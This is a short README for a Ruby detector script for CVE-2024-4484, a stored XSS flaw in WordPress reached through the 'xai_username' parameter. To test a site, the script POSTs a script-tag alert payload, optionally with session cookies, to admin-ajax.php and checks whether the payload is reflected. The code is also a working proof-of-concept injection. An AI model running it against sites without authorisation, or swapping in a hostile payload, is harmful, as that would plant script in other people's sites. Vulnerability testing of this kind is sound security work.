# CVE-2024-4484

---

### Cross-Site Scripting (XSS) Vulnerability Detector

This script uses `HTTParty` to detect stored cross-site scripting (XSS) vulnerabilities in WordPress sites using the `xai_username` parameter. It sends a payload to the specified URL and checks if the payload is reflected in the response, indicating a vulnerability.

#### Features
- Sends a POST request with a potential XSS payload.
- Checks if the response contains the payload, indicating a stored XSS vulnerability.
- Supports authentication by including cookies in the request.

#### Usage
```ruby
require 'httparty'

def detect_vulnerability(url, cookies = nil)
  param = "xai_username"
  payload = "<script>alert('XSS FROM ABO5')</script>"
  
  options = {
    body: { param => payload },
    headers: {}
  }

  options[:headers]['Cookie'] = cookies if cookies

  response = HTTParty.post(url, options)

  if response.headers['content-type'].include?('text/html') && response.body.include?(payload)
    puts "Vulnerability detected: #{url} is vulnerable to Stored Cross-Site Scripting (CVE-2024-4484)"
  else
    puts "Vulnerability not detected: #{url} is not vulnerable to Stored Cross-Site Scripting (CVE-2024-4484)"
  end
end

url = "https://example.com/wp-admin/admin-ajax.php" # Replace with the URL of the WordPress site
cookies = "your_cookie_here" # Replace with the user's cookies if authentication is required
detect_vulnerability(url, cookies)
```

---
